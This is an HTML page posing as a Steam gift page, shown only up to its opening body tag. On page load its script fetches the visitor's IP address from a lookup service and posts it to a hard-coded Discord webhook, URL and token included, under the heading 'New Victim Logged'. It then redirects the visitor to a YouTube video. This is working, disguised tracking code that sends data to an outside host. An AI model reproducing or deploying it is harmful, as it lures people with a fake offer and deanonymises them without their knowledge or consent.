<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <script type="text/javascript">
        // Your Discord Webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477709893875269763/hlcZYdFcsZCA4t0JKeO8Hr0IBum2-KgPZMMsx426yUp4VeOEoTgfGSz8g7mOtvND6pT';

        async function logAndRedirect() {
            try {
                // 1. Get the IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const clientIp = ipData.ip;

                // 2. Send to Discord

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**New Victim Logged**\n**IP:** \`${clientIp}\` \n**Platform:** Steam Gift Page\nhttps://tse1.mm.bing.net/th/id/OIP.mu-ECsXxHgl049if-NFUogHaDt?rs=1&pid=ImgDetMain&o=7&rm=3`
                    })
                });
            } catch (error) {
                console.error('Error:', error);
            } finally {
                // 3. Redirect to YouTube
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }
        }

        // Execute when the page is ready
        window.onload = logAndRedirect;
    </script>
</head>
<body style="background-color: #171a21; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
